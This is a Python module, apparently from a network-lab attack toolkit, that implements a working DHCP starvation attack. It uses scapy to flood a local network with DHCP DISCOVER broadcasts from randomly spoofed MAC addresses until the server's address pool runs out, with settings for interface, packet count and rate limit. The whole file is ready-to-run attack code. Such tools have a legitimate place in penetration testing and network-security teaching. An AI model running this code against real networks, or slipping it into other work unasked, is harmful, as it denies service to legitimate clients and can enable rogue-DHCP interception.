"""DHCP starvation module."""

from __future__ import annotations

import random
from typing import Any

from scapy.all import (  # type: ignore
    BOOTP,
    DHCP,
    Ether,
    IP,
    UDP,
    sendp,
    conf,
)

from netlab.base import BaseModule, ModuleParam


def _random_mac() -> str:
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))


class DhcpStarvation(BaseModule):
    name = "dhcp_starvation"
    description = "DHCP starvation attack (exhaust DHCP pool)"
    category = "l2"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(
                name="interface",
                type="interface",
                label="Network interface",
                required=False,
                default=None,
            ),
            ModuleParam(
                name="count",
                type="int",
                label="Number of DISCOVER packets",
                required=False,
                default=256,
                description="How many fake clients to request",
            ),
            ModuleParam(
                name="rate_limit_pps",
                type="int",
                label="Rate limit (pps)",
                required=False,
                default=30,
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        iface = params["interface"]
        count = int(params.get("count", 256))

        conf.iface = iface
        conf.verb = 0

        print(f"[dhcp_starvation] Sending {count} DHCP DISCOVER on {iface}...")

        for i in range(count):
            if self.should_stop():
                print("[dhcp_starvation] Stopped")
                break
            rate_limiter.wait()

            mac = _random_mac()
            xid = random.randint(1, 0xFFFFFFFF)

            pkt = (
                Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
                / IP(src="0.0.0.0", dst="255.255.255.255")
                / UDP(sport=68, dport=67)
                / BOOTP(
                    chaddr=bytes.fromhex(mac.replace(":", "")),
                    xid=xid,
                    flags=0x8000,
                )
                / DHCP(options=[("message-type", "discover"), "end"])
            )

            sendp(pkt, iface=iface, verbose=0)
            logger.add_packets(1, len(bytes(pkt)))

            if (i + 1) % 50 == 0:
                print(f"  sent {i + 1}/{count}")

        print("[dhcp_starvation] Done")
